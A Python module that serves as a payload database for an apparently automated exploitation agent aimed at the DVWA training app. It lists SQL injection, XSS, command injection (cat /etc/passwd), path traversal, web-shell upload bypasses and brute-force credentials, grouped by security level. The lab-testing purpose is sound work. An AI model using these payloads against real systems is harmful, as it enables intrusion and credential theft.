"""Payload library — per-vulnerability payload database and mutation engine."""

from dataclasses import dataclass, field


_SECURITY_LEVELS = {"low", "medium", "high"}


@dataclass(frozen=True)
class PayloadSet:
    """Immutable container for payloads associated with a single vulnerability class.

    Attributes:
        probe: Simple detection payloads used in Stage 1 of exploitation.
        exploit: Exploitation payloads used when a vulnerability is confirmed.
        bypass: Security-level–specific bypass payloads. Keyed by level name
            (``"low"``, ``"medium"``, ``"high"``).
    """

    probe: list[str] = field(default_factory=list)
    exploit: list[str] = field(default_factory=list)
    bypass: dict[str, list[str]] = field(default_factory=dict)


class PayloadLibrary:
    """Retrieve payloads by vulnerability class and security level."""

    _PAYLOAD_DB: dict[str, PayloadSet] = {
        "sqli": PayloadSet(
            probe=["1'", '1"', "1 OR 1=1"],
            exploit=[
                "1' UNION SELECT user(),database()-- -",
                "1' UNION SELECT user,password FROM users-- -",
            ],
            bypass={
                "medium": ["1 UNION SELECT user,password FROM users#"],
                "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
            },
        ),
        "sqli_blind": PayloadSet(
            probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
            exploit=["1' AND SLEEP(3)-- -", "1' AND ASCII(SUBSTR(database(),1,1))>77-- -"],
            bypass={
                "medium": ["1 AND SLEEP(3)#"],
                "high": ["1'/**/AND/**/SLEEP(3)-- -"],
            },
        ),
        "xss_r": PayloadSet(
            probe=["<script>alert(1)</script>"],
            exploit=["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
            bypass={
                "medium": ["<img src=x onerror=alert(1)>"],
                "high": ["\"><svg/onload=alert(1)>"],
            },
        ),
        "xss_s": PayloadSet(
            probe=["<script>alert(1)</script>"],
            exploit=["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
            bypass={
                "medium": ["<img src=x onerror=alert(1)>"],
                "high": ["<svg/onload=alert(1)>"],
            },
        ),
        "xss_d": PayloadSet(
            probe=["<script>alert(1)</script>"],
            exploit=["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
            bypass={
                "medium": ["<img src=x onerror=alert(1)>"],
                "high": ["<svg/onload=alert(1)>"],
            },
        ),
        "cmdi": PayloadSet(
            probe=["127.0.0.1; whoami", "127.0.0.1; id"],
            exploit=["127.0.0.1; cat /etc/passwd"],
            bypass={
                "medium": ["127.0.0.1& whoami"],
                "high": ["127.0.0.1|whoami"],
            },
        ),
        "brute": PayloadSet(
            probe=["admin:password", "admin:admin"],
            exploit=["gordonb:abc123", "pablo:letmein"],
            bypass={
                "medium": ["respect_rate_limit"],
                "high": ["respect_rate_limit"],
            },
        ),
        "lfi": PayloadSet(
            probe=["../../../etc/passwd"],
            exploit=["../../../../../../var/log/apache2/access.log"],
            bypass={
                "medium": ["....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd"],
                "high": ["file:///etc/passwd"],
            },
        ),
        "upload": PayloadSet(
            probe=["shell.php"],
            exploit=["shell.php?cmd=id"],
            bypass={
                "medium": ["shell.php.jpg", "shell.phtml"],
                "high": ["shell.php%00.jpg", "mime:image/jpeg"],
            },
        ),
        "csrf": PayloadSet(
            probe=["password_new=hacked&password_conf=hacked&Change=Change"],
            exploit=["token_theft_via_xss"],
            bypass={
                "medium": ["token_reuse_attempt"],
                "high": ["xss_token_exfiltration"],
            },
        ),
        "weak_session": PayloadSet(
            probe=["generate_session_sequence"],
            exploit=["predict_next_session"],
            bypass={
                "medium": ["timestamp_correlation"],
                "high": ["entropy_sampling"],
            },
        ),
        "idor": PayloadSet(
            probe=["id=1", "id=2"],
            exploit=["id=3", "id=4"],
            bypass={
                "medium": ["horizontal_increment"],
                "high": ["sparse_id_scan"],
            },
        ),
    }

    def get(self, vuln_class: str, security_level: str = "low") -> PayloadSet:
        """Return a defensive copy of payloads for ``vuln_class``.

        Unknown classes resolve to an empty ``PayloadSet``.
        Unknown security levels are normalized to ``"low"``.
        """
        payload_set = self._PAYLOAD_DB.get(vuln_class)
        if payload_set is None:
            return PayloadSet()

        normalized_level = security_level.lower().strip()
        if normalized_level not in _SECURITY_LEVELS:
            normalized_level = "low"

        bypass_copy = {
            level: list(values)
            for level, values in payload_set.bypass.items()
            if isinstance(level, str)
        }
        # Ensure the requested level key always exists for simple consumers.
        bypass_copy.setdefault(normalized_level, list(payload_set.bypass.get(normalized_level, [])))

        return PayloadSet(
            probe=list(payload_set.probe),
            exploit=list(payload_set.exploit),
            bypass=bypass_copy,
        )

    @staticmethod
    def record_tried(state: dict, module: str, payload: str) -> dict:
        """Produce a partial state update recording *payload* as tried for *module*.

        This is a pure function that returns a new dict without mutating *state*.
        The returned dict can be merged into LangGraph state via the appropriate
        reducer.

        Args:
            state: Current exploitation state (read-only).
            module: Module name (e.g. ``"sqli"``).
            payload: Payload string that was attempted.

        Returns:
            Partial state update: ``{"tried_payloads": {module: [...tried + payload]}}``
        """
        tried = dict(state.get("tried_payloads", {}))
        module_tried = list(tried.get(module, []))
        if payload not in module_tried:
            module_tried.append(payload)
        tried[module] = module_tried
        return {"tried_payloads": tried}

    @staticmethod
    def record_bypass(
        state: dict, technique: str, blocked_pattern: str | None = None
    ) -> dict:
        """Produce a partial state update recording a successful bypass technique.

        This is a pure function that returns a new dict without mutating *state*.

        Args:
            state: Current exploitation state (read-only).
            technique: Bypass technique that succeeded (e.g. ``"double_encode"``).
            blocked_pattern: The pattern that was bypassed, if known.

        Returns:
            Partial state update with ``"successful_bypasses"`` and optionally
            ``"blocked_patterns"``.
        """
        existing = list(state.get("successful_bypasses", []))
        additions = [] if technique in existing else [technique]

        update: dict = {"successful_bypasses": additions}
        if blocked_pattern:
            blocked_existing = list(state.get("blocked_patterns", []))
            update["blocked_patterns"] = [] if blocked_pattern in blocked_existing else [blocked_pattern]
        return update
